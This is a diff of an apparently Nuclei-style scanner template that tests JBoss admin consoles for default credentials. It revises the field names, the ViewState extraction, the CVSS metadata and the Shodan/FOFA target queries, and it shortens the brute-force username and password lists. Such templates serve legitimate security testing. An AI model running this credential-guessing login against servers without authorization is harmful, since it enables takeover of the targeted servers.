@@ -5,30 +5,28 @@ info:
   author: J2EEScan (ilmila), Tortuginator
   severity: high
   description: |
-    The JBoss AS/EAP SEAM-based administration console (/admin-console/login.seam) was
-    found accepting default or weak credentials, giving an attacker full remote
-    administration of the application server. Ported from the J2EEScan "JBoss Admin
-    Console" and "JBoss Admin Console Weak Password" checks.
+    JBoss AS/EAP SEAM-based administration console at /admin-console/login.seam accepted default credentials, granting an attacker full remote administration of the application server.
   reference:
     - https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/JBossAdminConsole.java
     - http://docs.jboss.org/jbossas/6/Admin_Console_Guide/en-US/html/Administration_Console_User_Guide-Accessing_the_Console.html
     - https://www.exploit-db.com/exploits/36653/
     - https://bugzilla.redhat.com/show_bug.cgi?id=615956
   classification:
-    cwe-id: CWE-798
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-1392
   metadata:
     verified: true
-    max-request: 181
+    max-request: 17
     vendor: redhat
     product: jboss_application_server
-    shodan-query: http.title:"JBoss AS Admin Console"
+    shodan-query: http.component:"JBoss"
+    fofa-query: app="JBoss"
   tags: jboss,admin-console,default-login,seam,vuln
 
 flow: http(1) && http(2)
 
 http:
-  # Request 1: detection gate - runs once; brute force (request 2) only
-  # executes if this matches, so non-JBoss hosts are never brute forced.
   - raw:
       - |
         GET /admin-console/login.seam HTTP/1.1
@@ -39,12 +37,10 @@ http:
         internal: true
         dsl:
           - 'status_code == 200'
-          - 'contains(body, "JBoss") && contains_any(body, "Admin Console", "Embedded Jopr")'
+          - 'contains_any(body, "JBoss AS Admin", "JBoss EAP Admin", "Embedded Jopr")'
+          - 'contains(body, "javax.faces.ViewState")'
         condition: and
 
-  # Request 2: GET (fresh ViewState) + POST, iterated by the clusterbomb.
-  # The whole block repeats per credential pair, so a new ViewState/session
-  # is obtained before each login attempt.
   - raw:
       - |
         GET /admin-console/login.seam HTTP/1.1
@@ -54,44 +50,30 @@ http:
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
 
-        login_form=login_form&login_form:name={{user}}&login_form:password={{pass}}&login_form:submit=Login&javax.faces.ViewState={{viewstate}}
+        login_form=login_form&login_form%3Aname={{username}}&login_form%3Apassword={{password}}&login_form%3Asubmit=Login&javax.faces.ViewState={{url_encode(viewstate)}}
 
     attack: clusterbomb
     payloads:
-      user:
+      username:
         - admin
-        - tomcat
-        - manager
-        - root
         - jboss
-        - test
-        - monitor
-        - guest
-        - system
-      pass:
+      password:
         - admin
+        - ""
         - jboss
         - password
-        - ""
-        - changethis
-        - manager
-        - root
-        - "1234"
-        - welcome1
-        - test
-    threads: 1
+
     stop-at-first-match: true
 
     extractors:
       - type: regex
         name: viewstate
         part: body
-        internal: true
         group: 1
+        internal: true
         regex:
-          - 'id="javax.faces.ViewState" value="(.*?)"'
+          - '(?:name|id)="javax\.faces\.ViewState"[^>]*?value="([^"]+)"'
 
-    matchers-condition: and
     matchers:
       - type: dsl
         dsl:
